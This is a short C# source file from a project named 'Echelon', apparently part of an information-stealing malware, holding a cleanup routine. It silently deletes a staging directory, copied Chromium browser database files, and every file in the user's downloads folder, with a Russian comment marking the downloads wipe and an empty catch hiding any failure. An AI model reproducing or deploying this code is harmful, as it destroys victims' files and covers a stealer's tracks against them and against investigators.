using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Echelon
{
    class Clean
    {
        public static void GetClean()
        {
            try {

                Help.Deocder();
                if (Directory.Exists(Help.dir))

                {
                    Directory.Delete(Help.dir + "\\", true);
                }
                else
                {

                }

                if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                if (File.Exists(Chromium.ls))
                    File.Delete(Chromium.ls);

                // Чистим папку загрузок
                foreach (string file in Directory.GetFiles(Help.downloadsDir))
                     File.Delete(file);
            }
            catch
            { }
        }
    }
}
